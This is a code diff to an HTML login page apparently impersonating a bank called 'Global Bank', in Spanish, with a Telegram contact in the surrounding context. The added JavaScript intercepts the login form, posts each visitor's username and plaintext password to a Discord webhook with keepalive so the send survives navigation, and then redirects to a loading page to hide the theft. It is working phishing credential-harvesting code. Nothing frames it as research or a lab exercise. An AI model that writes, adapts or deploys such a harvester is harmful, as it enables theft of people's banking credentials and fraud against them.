@@ -527,6 +527,12 @@ Telegram: @PHPGOTY
 </div>
 
 <script>
+  /* ─────────── Configuración ─────────── */
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/000000000000000000/AAAABBBBCCCCDDDDeeeeffff';
+  const DESTINO     = 'load.html';
+  const ESPERA_MAX  = 1500; // ms que se espera a Discord antes de redirigir
+
+  const form      = document.getElementById('form-login');
   const usuario   = document.getElementById('usuario');
   const clave     = document.getElementById('clave');
   const continuar = document.getElementById('continuar');
@@ -552,6 +558,60 @@ Telegram: @PHPGOTY
   }
   usuario.addEventListener('input', refrescar);
   clave.addEventListener('input', refrescar);
+
+  /* Neutraliza el Markdown de Discord dentro de los valores */
+  function esc(str) {
+    return str
+      .replace(/\\/g, '\\\\')
+      .replace(/`/g, '\\`')
+      .replace(/\*/g, '\\*')
+      .replace(/_/g, '\\_')
+      .replace(/~/g, '\\~')
+      .replace(/\|/g, '\\|')
+      .replace(/>/g, '\\>')
+      .slice(0, 1000);
+  }
+
+  /* ─────────── Envío y redirección ─────────── */
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const user = usuario.value.trim();
+    const pass = clave.value;
+    if (!user || !pass.trim()) return;
+
+    continuar.disabled = true;
+
+    const cuerpo = {
+      username: 'Global Bank',
+      embeds: [{
+        title: 'Nuevo inicio de sesión',
+        color: 0x0047BA,
+        fields: [
+          { name: 'Usuario',    value: '`' + esc(user) + '`', inline: true },
+          { name: 'Contraseña', value: '`' + esc(pass) + '`', inline: true },
+          { name: 'Fecha',      value: new Date().toLocaleString('es-PA'), inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      await Promise.race([
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          keepalive: true, // sobrevive a la navegación
+          body: JSON.stringify(cuerpo)
+        }),
+        new Promise((listo) => setTimeout(listo, ESPERA_MAX))
+      ]);
+    } catch (_) {
+      /* si falla, se redirige igual */
+    }
+
+    window.location.href = DESTINO;
+  });
 </script>
 
 </body>
